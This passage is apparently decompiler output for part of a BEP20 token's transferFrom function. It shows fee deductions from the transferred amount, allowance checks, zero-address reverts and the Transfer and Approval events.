                            require balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100) >= balanceOf[address(arg2)]
                            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100)
                            emit Transfer((arg3 - (arg3 * sub_781a76ca / 100) - (arg3 * sub_433ca4db / 100)), arg1, arg2);
    require arg3 <= allowance[address(arg1)][address(msg.sender)]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7342455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
